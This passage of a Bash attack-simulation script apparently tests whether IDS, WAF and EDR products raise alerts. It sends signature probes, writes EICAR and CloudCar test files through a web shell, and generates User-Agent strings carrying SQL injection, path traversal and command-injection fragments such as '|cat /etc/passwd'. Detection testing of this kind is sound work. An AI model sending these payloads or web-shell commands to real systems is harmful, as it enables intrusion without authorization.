- HTTPS insecure (-k)       : applied for https targets
- Safety                    : plain-text signature requests only (no reverse-shell execution)
EOF
}

stage_ids_waf_signature_probe() {
    local targets target_line host port scheme out
    local t_attempted=0 t_responses=0 t_traversal=0 t_tomcat=0 t_spring=0 t_edr=0
    local at resp trav tom spring edr idx=0 total=0

    poc_obs_stage_start "IDS/WAF Signature Probe"
    add_executed_stage "IDS/WAF Signature Probe"
    write_report_entries "ids_waf_signature_probe" "T1190/T1059" "IDS/WAF/EDR" "Signature Probe" "multi" "start" "IDS/WAF/EDR plain-text signature HTTP traffic"

    if [[ ! -s "${LOCAL_STATE_DIR}/remote_hosts/reachable_http_targets.txt" && ! -s "${LOCAL_STATE_DIR}/remote_hosts/reachable_https_targets.txt" ]]; then
        stage_validate_web_reachability || true
    fi

    targets=$(select_active_web_server_targets)
    total=$(printf '%s\n' "${targets}" | awk 'NF{c++} END{print c+0}')
    IDS_WAF_SIG_TARGET_COUNT="${total}"

    if (( total == 0 )); then
        IDS_WAF_SIG_PROBE_STATUS="skipped"
        log_message "WARN" "IDS/WAF signature probe skipped: no active HTTP/HTTPS web servers"
        set_stage_result "IDS/WAF Signature Probe" "Skipped" "no reachable web targets"
        write_report_entries "ids_waf_signature_probe" "T1190" "IDS/WAF" "Signature Probe" "multi" "skipped" "no targets"
        poc_obs_stage_end "IDS/WAF Signature Probe"
        return 0
    fi

    log_message "OK" "IDS/WAF signature probe: ${total} active web target(s), 8 signature requests per target (plain-text only)"
    state_append "ids_waf_signature_probe.log" "targets=${total} campaign=${CAMPAIGN_ID}"

    if [[ "${DRY_RUN}" == true ]]; then
        IDS_WAF_SIG_ATTEMPTED=$((total * 8))
        IDS_WAF_SIG_RESPONSES="${IDS_WAF_SIG_ATTEMPTED}"
        IDS_WAF_SIG_TRAVERSAL=$((total * 2))
        IDS_WAF_SIG_TOMCAT_PUT="${total}"
        IDS_WAF_SIG_SPRING_HDR="${total}"
        IDS_WAF_SIG_EDR_CMD=$((total * 4))
        IDS_WAF_SIG_PROBE_STATUS="success"
        set_stage_result "IDS/WAF Signature Probe" "Success" "dry-run planned ${IDS_WAF_SIG_ATTEMPTED} signature requests"
        write_report_entries "ids_waf_signature_probe" "T1190" "IDS/WAF" "Signature Probe" "multi" "success" "dry-run"
        poc_obs_stage_end "IDS/WAF Signature Probe"
        return 0
    fi

    while IFS= read -r target_line; do
        [[ -z "${target_line}" ]] && continue
        pipeline_stop_requested && break
        if [[ "${target_line}" == *" "* ]]; then
            read -r host port scheme <<< "${target_line}"
        elif read -r host port scheme <<< "$(web_target_parse_line "${target_line}" "http" 2>/dev/null)"; then
            :
        elif read -r host port scheme <<< "$(web_target_parse_line "${target_line}" "https" 2>/dev/null)"; then
            :
        else
            continue
        fi
        idx=$((idx + 1))
        poc_obs_log "INFO" "IDS/WAF Signature Probe: ${idx}/${total} ${scheme}://${host}:${port}"
        out=$(run_ids_waf_signature_probe_for_target "${host}" "${port}" "${scheme}")
        read -r at resp trav tom spring edr <<< "$(parse_sig_probe_stats_line "${out}")"
        sanitize_stats_ints at resp trav tom spring edr
        t_attempted=$((t_attempted + at))
        t_responses=$((t_responses + resp))
        t_traversal=$((t_traversal + trav))
        t_tomcat=$((t_tomcat + tom))
        t_spring=$((t_spring + spring))
        t_edr=$((t_edr + edr))
        state_append "ids_waf_signature_probe.log" "target=${host}:${port} scheme=${scheme} attempted=${at} responses=${resp} traversal=${trav} edr=${edr}"
        poc_obs_log "EVIDENCE" "Signature probe ${host}:${port} attempted=${at} responses=${resp} (traversal=${trav} tomcat_put=${tom} spring=${spring} edr=${edr})"
    done <<< "${targets}"

    IDS_WAF_SIG_ATTEMPTED="${t_attempted}"
    IDS_WAF_SIG_RESPONSES="${t_responses}"
    IDS_WAF_SIG_TRAVERSAL="${t_traversal}"
    IDS_WAF_SIG_TOMCAT_PUT="${t_tomcat}"
    IDS_WAF_SIG_SPRING_HDR="${t_spring}"
    IDS_WAF_SIG_EDR_CMD="${t_edr}"

    if (( t_attempted > 0 )); then
        IDS_WAF_SIG_PROBE_STATUS="success"
        set_stage_result "IDS/WAF Signature Probe" "Success" "targets=${total} attempted=${t_attempted} responses=${t_responses}"
        write_report_entries "ids_waf_signature_probe" "T1190" "IDS/WAF" "Signature Probe" "multi" "success" "signatures=${t_attempted}"
        log_message "OK" "$(format_ids_waf_signature_probe_block)"
    else
        IDS_WAF_SIG_PROBE_STATUS="failed"
        set_stage_result "IDS/WAF Signature Probe" "Failed" "no signature requests completed"
        write_report_entries "ids_waf_signature_probe" "T1190" "IDS/WAF" "Signature Probe" "multi" "failed" "no traffic"
        log_message "WARN" "IDS/WAF signature probe produced no completed requests"
    fi
    poc_obs_stage_end "IDS/WAF Signature Probe"
    return 0
}

# ==============================================================================
# EDR Static Signature Detection Test (EICAR + AMTSO CloudCar — files only, no execution)
# ==============================================================================

edr_static_test_log_both() {
    local msg="$1"
    state_append "edr_static_test.log" "${msg}"
    log_message "OK" "${msg}" >&2
}

edr_static_test_eicar_string() {
    printf '%s' 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
}

edr_static_test_cloudcar_string() {
    printf '%s' 'AMTSO-CLOUD-CAR-TEST-FILE-AMTSO-CLOUD-CAR-TEST-FILE-AMTSO-CLOUD-CAR'
}

edr_static_test_shell_escape_single() {
    printf '%s' "${1:-}" | sed "s/'/'\\\\''/g"
}

edr_static_test_file_specs() {
    printf '%s\t%s\n' "eicar_test.txt" "$(edr_static_test_eicar_string)"
    printf '%s\t%s\n' "cloudcar_test.txt" "$(edr_static_test_cloudcar_string)"
    printf '%s\t%s\n' "normal_image.png" "$(edr_static_test_eicar_string)"
    if [[ "${EDR_EXTENDED_FILES}" == true ]]; then
        printf '%s\t%s\n' "eicar_test.com" "$(edr_static_test_eicar_string)"
        printf '%s\t%s\n' "eicar_test.log" "$(edr_static_test_eicar_string)"
    fi
}

edr_static_test_content_to_b64() {
    if base64 -w0 </dev/null >/dev/null 2>&1; then
        printf '%s' "${1:-}" | base64 -w0
    else
        printf '%s' "${1:-}" | base64 | tr -d '\n'
    fi
}

build_edr_static_test_resolve_dir_remote_cmd() {
    local runtime_dir="${REMOTE_RUNTIME_DIR:-/tmp/.poc_runtime_root}"
    local os_type="${EDR_TEST_REMOTE_OS:-linux}"
    if [[ "${os_type}" == windows ]]; then
        cat <<EOF
if command -v powershell >/dev/null 2>&1; then d=\$(powershell -NoProfile -Command "foreach(\$x in @(\$env:TEMP,'C:\\Windows\\Temp')){if(\$x -and (Test-Path -LiteralPath \$x)){Write-Output \$x;break}}" 2>/dev/null | tr -d '\r' | head -n1); [ -n "\${d}" ] && echo "EDR_TEST_FILE_PATH dir=\${d} os=windows"; else echo 'EDR_STATIC_TEST_SUMMARY attempted=0 success=0 failed=0 dir=unwritable'; fi
EOF
        return 0
    fi
    cat <<EOF
edr_dir=""; for d in '${runtime_dir}/edr_test' '/tmp/.poc_runtime_root/edr_test' '/tmp'; do mkdir -p "\${d}" 2>/dev/null && : >"\${d}/.poc_edr_write_test" 2>/dev/null && { rm -f "\${d}/.poc_edr_write_test" 2>/dev/null || true; edr_dir="\${d}"; break; }; done; if [ -n "\${edr_dir}" ]; then echo "EDR_TEST_FILE_PATH dir=\${edr_dir} os=linux"; echo "EDR_TEST_HOST_CONTEXT hostname=\$(hostname 2>/dev/null || true) pwd=\$(pwd 2>/dev/null || true) id=\$(id 2>/dev/null || true)"; else echo 'EDR_STATIC_TEST_SUMMARY attempted=0 success=0 quarantine=0 failed=0 os=linux dir=unwritable'; fi
EOF
}

build_edr_static_test_write_file_remote_cmd() {
    local dir="$1" fn="$2" content="$3"
    local b64 fp_spec
    b64=$(edr_static_test_content_to_b64 "${content}")
    fp_spec="${dir}/${fn}"
    cat <<EOF
fp='${fp_spec}'; if printf '%s' '${b64}' | base64 -d > "\${fp}" 2>/dev/null; then if test -f "\${fp}"; then echo 'EDR_TEST_FILE_CREATE_SUCCESS file=${fn} path='\${fp}; echo 'EDR_TEST_FILE_PATH file=${fn} path='\${fp}; else echo 'EDR_QUARANTINE_SUSPECTED file=${fn} path='\${fp} status=possible_edr_quarantine; fi; else echo 'EDR_TEST_FILE_CREATE_FAILED file=${fn} path='\${fp}; fi
EOF
}

build_edr_static_test_verify_listing_remote_cmd() {
    local dir="${1:-${EDR_TEST_DIR:-}}"
    [[ -z "${dir}" ]] && return 1
    cat <<EOF
echo "EDR_TEST_VERIFY dir=${dir}"; ls -la '${dir}' 2>/dev/null || echo "EDR_TEST_VERIFY listing_failed dir=${dir}"; echo "EDR_TEST_HOST_CONTEXT hostname=\$(hostname 2>/dev/null || true) pwd=\$(pwd 2>/dev/null || true)"
EOF
}

build_edr_static_test_cleanup_remote_cmd() {
    local dir="${EDR_TEST_DIR:-}"
    local fn specs="" cmd=""
    [[ -z "${dir}" ]] && return 1
    while IFS= read -r fn; do
        [[ -z "${fn}" ]] && continue
        specs="${specs} '${dir}/${fn}'"
    done < <(edr_static_test_list_filenames)
    cmd="rm -f${specs} 2>/dev/null; rmdir '${dir}' 2>/dev/null || true"
    printf '%s' "${cmd}"
}

edr_static_test_list_filenames() {
    local line fn _content
    while IFS=$'\t' read -r fn _content; do
        [[ -n "${fn}" ]] && printf '%s\n' "${fn}"
    done < <(edr_static_test_file_specs)
}

# Legacy aggregate builder (resolve + one file) retained for validation smoke tests.
build_edr_static_test_remote_cmd() {
    local sample
    sample=$(build_edr_static_test_write_file_remote_cmd "/tmp/.poc_runtime_root/edr_test" "eicar_test.txt" "$(edr_static_test_eicar_string)")
    printf '%s\n%s' "$(build_edr_static_test_resolve_dir_remote_cmd)" "${sample}"
}

cleanup_edr_static_test_on_exit() {
    local cleanup_cmd=""
    [[ "${EDR_STATIC_TEST_ENABLED}" != true ]] && return 0
    [[ "${EDR_TEST_CLEANUP}" != true ]] && return 0
    [[ "${DRY_RUN}" == true ]] && return 0
    [[ "${KEEP_ARTIFACTS}" == true ]] && return 0
    [[ "${EDR_STATIC_TEST_FILES_CREATED}" != true && -z "${EDR_TEST_DIR}" ]] && return 0
    cleanup_cmd=$(build_edr_static_test_cleanup_remote_cmd) || return 0
    edr_static_test_log_both "EDR_STATIC_TEST_CLEANUP dir=${EDR_TEST_DIR:-n/a} timing=poc_exit retain_during_run=true"
    run_webshell_quick "edr-static-cleanup-exit" "${cleanup_cmd}" >/dev/null 2>&1 || true
}

run_edr_static_test_file_creation() {
    local resolve_cmd resolve_out line fn content file_cmd file_out
    EDR_TEST_FILES_ATTEMPTED=0
    EDR_TEST_FILES_SUCCESS=0
    EDR_TEST_QUARANTINE_SUSPECTED=0
    EDR_TEST_FILES_FAILED=0
    EDR_TEST_FILE_PATHS=""
    EDR_STATIC_TEST_FILES_CREATED=false

    resolve_cmd=$(build_edr_static_test_resolve_dir_remote_cmd)
    resolve_out=$(run_webshell_quick "edr-static-resolve-dir" "${resolve_cmd}" 2>/dev/null || true)
    resolve_out=$(printf '%s' "${resolve_out}" | tr -d '\r')
    parse_edr_static_test_output "${resolve_out}"
    if [[ -z "${EDR_TEST_DIR}" ]]; then
        return 1
    fi

    while IFS=$'\t' read -r fn content; do
        [[ -z "${fn}" ]] && continue
        pipeline_stop_requested && break
        EDR_TEST_FILES_ATTEMPTED=$((EDR_TEST_FILES_ATTEMPTED + 1))
        edr_static_test_log_both "EDR_TEST_FILE_CREATE_ATTEMPT file=${fn} path=${EDR_TEST_DIR}/${fn} os=${EDR_TEST_REMOTE_OS}"
        file_cmd=$(build_edr_static_test_write_file_remote_cmd "${EDR_TEST_DIR}" "${fn}" "${content}")
        webshell_apply_payload_transport "EDR_STATIC_TEST" "${#file_cmd}"
        EDR_TEST_WEBSHELL_METHOD="${WEBSHELL_METHOD:-GET}"
        file_out=$(run_webshell_quick "edr-static-file-${fn}" "${file_cmd}" 2>/dev/null || true)
        file_out=$(printf '%s' "${file_out}" | tr -d '\r')
        while IFS= read -r line; do
            [[ -z "${line}" ]] && continue
            case "${line}" in
                EDR_TEST_FILE_CREATE_SUCCESS*)
                    EDR_TEST_FILES_SUCCESS=$((EDR_TEST_FILES_SUCCESS + 1))
                    EDR_STATIC_TEST_FILES_CREATED=true
                    fpath=$(sed -n 's/.* path=\([^ ]*\).*/\1/p' <<< "${line}")
                    EDR_TEST_FILE_PATHS="${EDR_TEST_FILE_PATHS}${fpath};"
                    edr_static_test_log_both "${line}"
                    ;;
                EDR_QUARANTINE_SUSPECTED*)
                    EDR_TEST_QUARANTINE_SUSPECTED=$((EDR_TEST_QUARANTINE_SUSPECTED + 1))
                    edr_static_test_log_both "${line}"
                    ;;
                EDR_TEST_FILE_CREATE_FAILED*)
                    EDR_TEST_FILES_FAILED=$((EDR_TEST_FILES_FAILED + 1))
                    edr_static_test_log_both "${line}"
                    ;;
            esac
        done <<< "${file_out}"
    done < <(edr_static_test_file_specs)

    if [[ -n "${EDR_TEST_DIR}" ]]; then
        local verify_cmd verify_out
        verify_cmd=$(build_edr_static_test_verify_listing_remote_cmd "${EDR_TEST_DIR}")
        verify_out=$(run_webshell_quick "edr-static-verify-listing" "${verify_cmd}" 2>/dev/null || true)
        verify_out=$(printf '%s' "${verify_out}" | tr -d '\r')
        while IFS= read -r line; do
            [[ -z "${line}" ]] && continue
            case "${line}" in
                EDR_TEST_VERIFY*|EDR_TEST_HOST_CONTEXT*)
                    edr_static_test_log_both "${line}"
                    ;;
            esac
        done <<< "${verify_out}"
        edr_static_test_log_both "EDR_TEST_NOTE files exist on webshell-host filesystem only (search host /tmp if tomcat/docker — may need container exec)"
    fi
    return 0
}

parse_edr_static_test_output() {
    local out="$1"
    local line
    EDR_TEST_FILES_ATTEMPTED=0
    EDR_TEST_FILES_SUCCESS=0
    EDR_TEST_QUARANTINE_SUSPECTED=0
    EDR_TEST_FILES_FAILED=0
    EDR_TEST_REMOTE_OS=unknown
    EDR_TEST_DIR=""
    EDR_TEST_FILE_PATHS=""
    while IFS= read -r line; do
        [[ -z "${line}" ]] && continue
        case "${line}" in
            EDR_TEST_FILE_CREATE_ATTEMPT*)
                EDR_TEST_FILES_ATTEMPTED=$((EDR_TEST_FILES_ATTEMPTED + 1))
                ;;
            EDR_TEST_FILE_CREATE_SUCCESS*)
                EDR_TEST_FILES_SUCCESS=$((EDR_TEST_FILES_SUCCESS + 1))
                ;;
            EDR_QUARANTINE_SUSPECTED*)
                EDR_TEST_QUARANTINE_SUSPECTED=$((EDR_TEST_QUARANTINE_SUSPECTED + 1))
                ;;
            EDR_TEST_FILE_CREATE_FAILED*)
                EDR_TEST_FILES_FAILED=$((EDR_TEST_FILES_FAILED + 1))
                ;;
            EDR_TEST_FILE_PATH\ dir=*)
                EDR_TEST_DIR=$(sed -n 's/.* dir=\([^ ]*\).*/\1/p' <<< "${line}")
                EDR_TEST_REMOTE_OS=$(sed -n 's/.* os=\([^ ]*\).*/\1/p' <<< "${line}")
                ;;
            EDR_TEST_FILE_PATH\ file=*)
                local fpath
                fpath=$(sed -n 's/.* path=\([^ ]*\).*/\1/p' <<< "${line}")
                EDR_TEST_FILE_PATHS="${EDR_TEST_FILE_PATHS}${fpath};"
                ;;
            EDR_TEST_HOST_CONTEXT*)
                edr_static_test_log_both "${line}"
                ;;
            EDR_TEST_VERIFY*)
                edr_static_test_log_both "${line}"
                ;;
            EDR_STATIC_TEST_SUMMARY*)
                EDR_TEST_FILES_ATTEMPTED=$(safe_int "$(sed -n 's/.*attempted=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
                EDR_TEST_FILES_SUCCESS=$(safe_int "$(sed -n 's/.*success=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
                EDR_TEST_QUARANTINE_SUSPECTED=$(safe_int "$(sed -n 's/.*quarantine=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
                EDR_TEST_FILES_FAILED=$(safe_int "$(sed -n 's/.*failed=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
                EDR_TEST_REMOTE_OS=$(sed -n 's/.* os=\([^ ]*\).*/\1/p' <<< "${line}")
                EDR_TEST_DIR=$(sed -n 's/.* dir=\([^ ]*\).*/\1/p' <<< "${line}")
                local paths_field
                paths_field=$(sed -n 's/.* paths=\([^ ]*\).*/\1/p' <<< "${line}")
                [[ -n "${paths_field}" && "${paths_field}" != "paths=" ]] && EDR_TEST_FILE_PATHS="${paths_field}"
                ;;
        esac
    done <<< "${out}"
}

finalize_edr_static_test_judgment() {
    local stage_label="${1:-EDR Static Signature Detection Test}"
    local detail_prefix="${2:-}"
    if [[ "${WEBSHELL_CHANNEL_BROKEN}" == true ]]; then
        EDR_STATIC_STAGE_STATUS="Failed"
        set_stage_result "${stage_label}" "Failed" "${detail_prefix}webshell command execution failed"
        return 1
    fi
    if (( EDR_TEST_FILES_SUCCESS > 0 || EDR_TEST_QUARANTINE_SUSPECTED > 0 )); then
        if (( EDR_TEST_FILES_FAILED > 0 )) || (( EDR_TEST_FILES_SUCCESS > 0 && EDR_TEST_QUARANTINE_SUSPECTED > 0 && EDR_TEST_FILES_SUCCESS + EDR_TEST_QUARANTINE_SUSPECTED < EDR_TEST_FILES_ATTEMPTED )); then
            EDR_STATIC_STAGE_STATUS="Partial"
            set_stage_result "${stage_label}" "Partial" "${detail_prefix}attempted=${EDR_TEST_FILES_ATTEMPTED} success=${EDR_TEST_FILES_SUCCESS} quarantine=${EDR_TEST_QUARANTINE_SUSPECTED} failed=${EDR_TEST_FILES_FAILED}"
            return 0
        fi
        EDR_STATIC_STAGE_STATUS="Success"
        set_stage_result "${stage_label}" "Success" "${detail_prefix}attempted=${EDR_TEST_FILES_ATTEMPTED} success=${EDR_TEST_FILES_SUCCESS} quarantine=${EDR_TEST_QUARANTINE_SUSPECTED} os=${EDR_TEST_REMOTE_OS}"
        return 0
    fi
    if (( EDR_TEST_FILES_ATTEMPTED == 0 )); then
        EDR_STATIC_STAGE_STATUS="Failed"
        set_stage_result "${stage_label}" "Failed" "${detail_prefix}no file create attempts (dir=${EDR_TEST_DIR:-unwritable})"
        return 1
    fi
    EDR_STATIC_STAGE_STATUS="Failed"
    set_stage_result "${stage_label}" "Failed" "${detail_prefix}attempted=${EDR_TEST_FILES_ATTEMPTED} success=0 failed=${EDR_TEST_FILES_FAILED}"
    return 1
}

format_edr_static_test_block() {
    cat <<EOF
EDR Static Signature Detection Test (EICAR + AMTSO CloudCar — create only, no execution)
- Status                    : ${EDR_STATIC_STAGE_STATUS}
- Files attempted           : ${EDR_TEST_FILES_ATTEMPTED}
- Files created             : ${EDR_TEST_FILES_SUCCESS}
- Quarantine suspected      : ${EDR_TEST_QUARANTINE_SUSPECTED}
- Create failed             : ${EDR_TEST_FILES_FAILED}
- Remote OS                 : ${EDR_TEST_REMOTE_OS}
- Test directory            : ${EDR_TEST_DIR:-n/a}
- File paths                : ${EDR_TEST_FILE_PATHS:-n/a}
- Webshell URL              : ${WEB_SHELL_URL:-n/a}
- Webshell method           : ${EDR_TEST_WEBSHELL_METHOD:-${WEBSHELL_METHOD:-GET}}
- Extended files (.com/.log): ${EDR_EXTENDED_FILES}
- Cleanup on PoC exit        : ${EDR_TEST_CLEANUP} (files retained during run; removed at script exit)
- Safety                    : official EICAR/AMTSO test strings only; files created, never executed
EOF
}

write_edr_static_test_report() {
    [[ -z "${REPORT_MD}" ]] && return 0
    cat <<EOF >> "${REPORT_MD}" 2>/dev/null || true

## EDR Static Signature Detection Test

| Metric | Value |
|---|---|
| Stage status | ${EDR_STATIC_STAGE_STATUS} |
| Files attempted | ${EDR_TEST_FILES_ATTEMPTED} |
| Files created | ${EDR_TEST_FILES_SUCCESS} |
| Quarantine suspected | ${EDR_TEST_QUARANTINE_SUSPECTED} |
| Create failed | ${EDR_TEST_FILES_FAILED} |
| Remote OS | ${EDR_TEST_REMOTE_OS} |
| Test directory | ${EDR_TEST_DIR:-n/a} |
| Webshell URL | ${WEB_SHELL_URL:-n/a} |
| Webshell method | ${EDR_TEST_WEBSHELL_METHOD:-${WEBSHELL_METHOD:-GET}} |
| Extended files | ${EDR_EXTENDED_FILES} |
| Cleanup on PoC exit | ${EDR_TEST_CLEANUP} |

### Test file paths
$(printf '%s' "${EDR_TEST_FILE_PATHS:-n/a}" | tr ';' '\n' | sed '/^$/d' | sed 's/^/- /')

### Expected detections
- EICAR Test File
- AMTSO CloudCar Test File
- Suspicious Test File Creation
- File Created Then Immediately Removed
- Potential AV/EDR Quarantine Event

EOF
}

edr_static_test_webshell_exec_failed() {
    local out="$1" payload="$2" http_code="${3:-${WEBSHELL_LAST_HTTP_CODE:-000}}"
    local low=""
    low=$(printf '%s' "${out}" | tr '[:upper:]' '[:lower:]')
    if [[ "${http_code}" == "000" ]]; then
        return 0
    fi
    if [[ -z "${out}" ]] && (( ${#payload} > PAYLOAD_WARN_BYTES )); then
        return 0
    fi
    if [[ "${low}" == *"command timed out"* || "${low}" == *"killed"* ]]; then
        return 0
    fi
    if [[ -z "${out}" && "${http_code}" =~ ^2[0-9][0-9]$ ]]; then
        return 0
    fi
    [[ "${out}" != *"EDR_STATIC_TEST_START"* && "${out}" != *"EDR_STATIC_TEST_SUMMARY"* ]]
}

stage_edr_static_detection_test() {
    local remote_cmd out payload_bytes saved_ws_method="" stage_status="" detail=""
    poc_obs_stage_start "EDR Static Signature Detection Test"
    add_executed_stage "EDR Static Signature Detection Test"
    write_report_entries "edr_static_detection_test" "T1204.002" "EDR/AV/XDR" "Static Signature Detection" "webshell-host" "start" "EICAR+CloudCar file create (no execution)"

    if [[ "${EDR_STATIC_TEST_ENABLED}" != true ]]; then
        EDR_STATIC_STAGE_STATUS="Skipped"
        set_stage_result "EDR Static Signature Detection Test" "Skipped" "disabled via --disable-edr-static-test"
        write_report_entries "edr_static_detection_test" "T1204.002" "EDR/AV/XDR" "Static Signature Detection" "webshell-host" "skipped" "disabled"
        poc_obs_stage_end "EDR Static Signature Detection Test"
        return 0
    fi

    edr_static_test_log_both "EDR_STATIC_TEST_START url=${WEB_SHELL_URL:-n/a} extended=${EDR_EXTENDED_FILES} cleanup_on_exit=${EDR_TEST_CLEANUP} retain_during_run=true purpose=PoC-EDR-static-signature-validation"

    if [[ "${DRY_RUN}" == true ]]; then
        local planned=3
        [[ "${EDR_EXTENDED_FILES}" == true ]] && planned=5
        EDR_TEST_FILES_ATTEMPTED="${planned}"
        EDR_TEST_FILES_SUCCESS="${planned}"
        EDR_TEST_REMOTE_OS="linux"
        EDR_TEST_DIR="${REMOTE_RUNTIME_DIR:-/tmp/.poc_runtime_root}/edr_test"
        EDR_STATIC_STAGE_STATUS="Success"
        edr_static_test_log_both "EDR_STATIC_TEST_SUMMARY attempted=${planned} success=${planned} quarantine=0 failed=0 os=linux dry_run=true"
        set_stage_result "EDR Static Signature Detection Test" "Success" "dry-run planned ${planned} official test files"
        write_report_entries "edr_static_detection_test" "T1204.002" "EDR/AV/XDR" "Static Signature Detection" "webshell-host" "success" "dry-run"
        poc_obs_stage_end "EDR Static Signature Detection Test"
        return 0
    fi

    detect_webshell_remote_os
    EDR_TEST_REMOTE_OS="unknown"

    saved_ws_method="$(webshell_save_active_transport)"
    EDR_TEST_WEBSHELL_METHOD="$(webshell_effective_method)"
    run_edr_static_test_file_creation
    webshell_restore_active_transport "${saved_ws_method}"

    if [[ -z "${EDR_TEST_DIR}" ]] && (( EDR_TEST_FILES_ATTEMPTED == 0 )); then
        WEBSHELL_CHANNEL_BROKEN=true
        poc_log_root_cause_analysis "EDR" "resolve-dir" "no writable edr dir" "${WEBSHELL_LAST_HTTP_CODE:-000}"
        edr_static_test_log_both "ROOT_CAUSE_ANALYSIS module=EDR webshell command execution failed — subsequent webshell follow-ups will be skipped"
        EDR_STATIC_STAGE_STATUS="Failed"
        set_stage_result "EDR Static Signature Detection Test" "Failed" "no writable edr test directory on webshell host"
        write_report_entries "edr_static_detection_test" "T1204.002" "EDR/AV/XDR" "Static Signature Detection" "webshell-host" "failed" "dir unwritable"
        poc_obs_stage_end "EDR Static Signature Detection Test"
        return 0
    fi

    edr_static_test_log_both "EDR_STATIC_TEST_SUMMARY attempted=${EDR_TEST_FILES_ATTEMPTED} success=${EDR_TEST_FILES_SUCCESS} quarantine=${EDR_TEST_QUARANTINE_SUSPECTED} failed=${EDR_TEST_FILES_FAILED} os=${EDR_TEST_REMOTE_OS} dir=${EDR_TEST_DIR:-n/a} paths=${EDR_TEST_FILE_PATHS:-n/a} cleanup_on_exit=${EDR_TEST_CLEANUP}"
    finalize_edr_static_test_judgment "EDR Static Signature Detection Test" "" || true
    stage_status="${EDR_STATIC_STAGE_STATUS}"
    write_report_entries "edr_static_detection_test" "T1204.002" "EDR/AV/XDR" "Static Signature Detection" "webshell-host" \
        "$([[ "${stage_status}" == Success || "${stage_status}" == Partial ]] && printf success || printf partial)" \
        "attempted=${EDR_TEST_FILES_ATTEMPTED} success=${EDR_TEST_FILES_SUCCESS} quarantine=${EDR_TEST_QUARANTINE_SUSPECTED}"
    log_message "OK" "$(format_edr_static_test_block)"
    poc_obs_stage_end "EDR Static Signature Detection Test"
    return 0
}

resolve_http_followup_mode() {
    if [[ "${HAS_curl:-false}" == true ]]; then
        HTTP_FOLLOWUP_MODE="curl"
        EXPECTED_HTTP_DETECTION_IMPACT="high"
    elif [[ "${HAS_python3:-false}" == true ]]; then
        HTTP_FOLLOWUP_MODE="python"
        EXPECTED_HTTP_DETECTION_IMPACT="high"
    else
        HTTP_FOLLOWUP_MODE="tcp-fallback"
        EXPECTED_HTTP_DETECTION_IMPACT="low"
    fi
}

sync_http_followup_counter_aliases() {
    HTTP_FOLLOWUP_ATTEMPTED="${HTTP_REQUESTS_ATTEMPTED}"
    HTTP_FOLLOWUP_CONNECTED="${HTTP_CONNECTED}"
}

# --- HTTP User-Agent pools (url_scan burst: 0% normal / 50% rare / 50% payload) ---
http_ua_pick_payload_fragment_local() {
    case $((RANDOM % 4)) in
        0)
            case $((RANDOM % 9)) in
                0) printf '%s' "' OR 1=1--" ;;
                1) printf '%s' '" OR 1=1--' ;;
                2) printf '%s' "1' OR '1'='1" ;;
                3) printf '%s' '1 OR 2+701-701-1=0+0+0+1' ;;
                4) printf '%s' '(select convert(int,char(65)))' ;;
                5) printf '%s' 'select pg_sleep(3)' ;;
                6) printf '%s' 'select pg_sleep(6)' ;;
                7) printf '%s' "waitfor delay '0:0:5'" ;;
                8) printf '%s' "waitfor delay '0:0:9'" ;;
            esac
            ;;
        1)
            case $((RANDOM % 6)) in
                0) printf '%s' '%00%0d%0a' ;;
                1) printf '%s' '%00%0a' ;;
                2) printf '%s' '%0d%0a' ;;
                3) printf '%s' '../../../../etc/passwd' ;;
                4) printf '%s' '..%2f..%2f..%2f' ;;
                5) printf '%s' '%252e%252e%252f' ;;
            esac
            ;;
        2)
            case $((RANDOM % 4)) in
                0) printf '%s' ';id' ;;
                1) printf '%s' ';whoami' ;;
                2) printf '%s' '&&hostname' ;;
                3) printf '%s' '|cat /etc/passwd' ;;
            esac
            ;;
        3)
            case $((RANDOM % 4)) in
                0) printf '%s' '12345\"\"\"};]*' ;;
                1) printf '%s' '@@@@@@@' ;;
                2) printf '%s' '%%%%%%%' ;;
                3) printf '%s' '<<<<>>>>' ;;
            esac
            ;;
    esac
}

http_ua_pick_rare_scanner_local() {
    case $((RANDOM % 12)) in
        0) printf '%s' 'TelemetryCollector/9.7' ;;
        1) printf '%s' 'ReconEngine/5.4' ;;
        2) printf '%s' 'SecurityAssessmentClient/3.1' ;;
        3) printf '%s' 'ThreatHunterAgent/8.2' ;;
        4) printf '%s' 'InternalAuditScanner/4.0' ;;
        5) printf '%s' 'DiscoveryProbe/7.3' ;;
        6) printf '%s' 'VulnerabilitySweep/2.6' ;;
        7) printf '%s' 'WebEnumerationFramework/11.0' ;;
        8) printf '%s' 'AssetProfiler/6.5' ;;
        9) printf '%s' 'NetworkSurveyBot/3.9' ;;
        10) printf '%s' 'Mozilla/5.0 ReconEngine/5.4' ;;
        11) printf '%s' 'Mozilla/5.0 ThreatHunterAgent/8.2' ;;
    esac
}

http_ua_pick_normal_local() {
    if (( RANDOM % 2 == 0 )); then
        printf '%s' 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    else
        printf '%s' 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15'
    fi
}

http_ua_pick_local() {
    local roll=$((RANDOM % 100)) pref payload
    if (( roll < 10 )); then
        http_ua_pick_normal_local
        return 0
    fi
    if (( roll < 50 )); then
        http_ua_pick_rare_scanner_local
        return 0
    fi
    if (( RANDOM % 2 == 0 )); then
        pref=$(http_ua_pick_rare_scanner_local)
        payload=$(http_ua_pick_payload_fragment_local)
        printf '%s %s' "${pref}" "${payload}"
    else
        http_ua_pick_payload_fragment_local
    fi
}

http_ua_is_normal_local() {
    local ua="$1"
    [[ "${ua}" == *"Chrome/120.0.0.0"* || "${ua}" == *"Version/17.0 Safari"* ]]
}

http_ua_classify_local() {
    local ua="$1"
    if http_ua_is_normal_local "${ua}"; then
        printf 'normal'
        return 0
    fi
    if printf '%s' "${ua}" | grep -qiE 'OR 1=1|pg_sleep|waitfor delay|convert\(int|'\''='\''|2\+701'; then
        printf 'payload_sqli'
        return 0
    fi
    if printf '%s' "${ua}" | grep -qE '%00|%0d|%0a|%2f|%252e|\.\./|/etc/passwd|%%%%|@@@@|<<<<|\|\|\|\|'; then
        printf 'payload_enc'
        return 0
    fi
    if printf '%s' "${ua}" | grep -qE ';id|;whoami|&&hostname|\|cat '; then
        printf 'payload_cmd'
